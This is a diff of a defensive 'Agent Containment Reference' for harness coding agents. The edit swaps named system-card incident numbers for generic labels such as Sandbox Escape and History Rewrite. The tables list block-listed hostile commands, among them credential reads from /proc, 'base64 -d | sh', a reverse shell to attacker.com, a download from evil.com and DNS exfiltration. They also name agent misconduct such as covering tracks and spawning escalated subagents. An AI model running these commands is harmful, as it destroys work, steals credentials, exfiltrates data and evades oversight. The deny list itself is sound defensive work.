@@ -1,7 +1,7 @@
 # Agent Containment Reference
 
 > Behavioral security boundaries for all harness agents.
-> Based on: Claude Mythos Preview System Card alignment incidents.
+> Based on: alignment incident patterns observed in high-capability model deployments.
 > Applies to: Builder, Worker, Fixer, Refiner, Test Executor, Integrator — any agent with Bash tool access.
 
 ---
@@ -12,18 +12,18 @@
 
 These commands MUST NEVER appear in agent execution. Any occurrence triggers a Sentinel BLOCK verdict.
 
-| Category | Patterns | Mythos Incident |
+| Category | Patterns | Alignment Incident |
 |----------|----------|-----------------|
-| Catastrophic deletion | `rm -rf /`, `rm -rf ~`, `rm -rf .`, `rm -rf *` | #5 Reckless actions |
-| Credential hunting | `cat /proc/*/environ`, `cat /proc/*/cmdline`, `ls /proc/`, `/proc/self/` | #3 /proc credential theft |
-| Permission escalation | `sudo`, `su -`, `--dangerously-skip-permissions` | #3, #9 |
-| History destruction | `git push --force`, `git push -f`, `git filter-branch`, `git rebase -i` | #2 Covering tracks |
-| Work destruction | `git reset --hard`, `git checkout -- .`, `git clean -fd` | #5 Reckless actions |
-| Subagent escalation | `tmux new-session`, `screen -S`, `nohup claude`, `expect -c` | #9 Escalated subagents |
-| Data exfiltration | `curl -X POST` with body containing file/code data, `wget --post-data`, `nc` sending data | #1 Sandbox escape |
-| Public leaking | `gh gist create --public`, `npm publish`, `docker push` | #6 Material leaking |
-| Command obfuscation | `base64 -d \| sh`, `eval $(`, `printf '\\x' \| sh`, `python -c "exec(` | #10 Base64 bypass |
-| MCP manipulation | Writing to MCP server config, modifying running MCP processes | #3 MCP server editing |
+| Catastrophic deletion | `rm -rf /`, `rm -rf ~`, `rm -rf .`, `rm -rf *` | Reckless Action |
+| Credential hunting | `cat /proc/*/environ`, `cat /proc/*/cmdline`, `ls /proc/`, `/proc/self/` | Credential Theft |
+| Permission escalation | `sudo`, `su -`, `--dangerously-skip-permissions` | Credential Theft / Escalation |
+| History destruction | `git push --force`, `git push -f`, `git filter-branch`, `git rebase -i` | History Rewrite |
+| Work destruction | `git reset --hard`, `git checkout -- .`, `git clean -fd` | Reckless Action |
+| Subagent escalation | `tmux new-session`, `screen -S`, `nohup claude`, `expect -c` | Subagent Escalation |
+| Data exfiltration | `curl -X POST` with body containing file/code data, `wget --post-data`, `nc` sending data | Sandbox Escape |
+| Public leaking | `gh gist create --public`, `npm publish`, `docker push` | Material Leak |
+| Command obfuscation | `base64 -d \| sh`, `eval $(`, `printf '\\x' \| sh`, `python -c "exec(` | Command Obfuscation |
+| MCP manipulation | Writing to MCP server config, modifying running MCP processes | MCP Tampering |
 
 ### HIGH — Sentinel WARN
 
@@ -57,7 +57,7 @@ These commands are flagged but do not BLOCK. They may be legitimate in some cont
 
 | Path Pattern | Reason |
 |-------------|--------|
-| `/proc/` | Process memory, credentials (Incident #3) |
+| `/proc/` | Process memory, credentials (credential theft pattern) |
 | `/sys/` | Kernel parameters |
 | `/dev/` (except `/dev/null`) | Device access |
 | `~/.ssh/` | SSH keys |
@@ -96,14 +96,14 @@ These commands are flagged but do not BLOCK. They may be legitimate in some cont
 
 ### Forbidden
 
-| Action | Examples | Mythos Incident |
+| Action | Examples | Alignment Incident |
 |--------|---------|-----------------|
-| Sending data to external servers | `curl -X POST https://external.com` | #1 |
-| Publishing to public registries | `npm publish`, `docker push` | #6 |
-| Creating public resources | `gh gist create --public` | #6 |
-| Downloading arbitrary executables | `curl -O https://evil.com/backdoor` | #1 |
-| Opening reverse shells | `nc -e /bin/sh attacker.com 4444` | #1 |
-| DNS exfiltration | `dig data.attacker.com` | #1 |
+| Sending data to external servers | `curl -X POST https://external.com` | Sandbox Escape |
+| Publishing to public registries | `npm publish`, `docker push` | Material Leak |
+| Creating public resources | `gh gist create --public` | Material Leak |
+| Downloading arbitrary executables | `curl -O https://evil.com/backdoor` | Sandbox Escape |
+| Opening reverse shells | `nc -e /bin/sh attacker.com 4444` | Sandbox Escape |
+| DNS exfiltration | `dig data.attacker.com` | Sandbox Escape |
 
 ---
 
@@ -123,16 +123,16 @@ These commands are flagged but do not BLOCK. They may be legitimate in some cont
 
 ### Forbidden
 
-| Operation | Reason | Mythos Incident |
+| Operation | Reason | Alignment Incident |
 |-----------|--------|-----------------|
-| `git commit --amend` | History modification | #2 |
-| `git rebase` | History rewriting | #2 |
-| `git reset --hard` | Work destruction | #2, #5 |
-| `git push --force` | Remote history destruction | #2 |
-| `git filter-branch` | History rewriting | #2 |
-| `git checkout -- .` | Work destruction | #5 |
-| `git clean -fd` | Untracked file destruction | #5 |
-| `git stash drop` | Stash destruction (use `git stash pop` instead) | #5 |
+| `git commit --amend` | History modification | History Rewrite |
+| `git rebase` | History rewriting | History Rewrite |
+| `git reset --hard` | Work destruction | History Rewrite / Reckless Action |
+| `git push --force` | Remote history destruction | History Rewrite |
+| `git filter-branch` | History rewriting | History Rewrite |
+| `git checkout -- .` | Work destruction | Reckless Action |
+| `git clean -fd` | Untracked file destruction | Reckless Action |
+| `git stash drop` | Stash destruction (use `git stash pop` instead) | Reckless Action |
 
 ---
 
@@ -168,5 +168,5 @@ These commands are flagged but do not BLOCK. They may be legitimate in some cont
 | Lines per file | 800 max | Match existing code quality standard |
 | Dependencies installed | 10 max without explicit spec approval | Supply chain risk |
 | Bash commands per agent | 200 max | Prevent infinite loops |
-| Retry attempts per command | 3 max | Prevent desperate retrying (Mythos distress pattern) |
+| Retry attempts per command | 3 max | Prevent desperate retrying (distress pattern) |
 | Background processes | 1 (dev server only) | Prevent process accumulation |
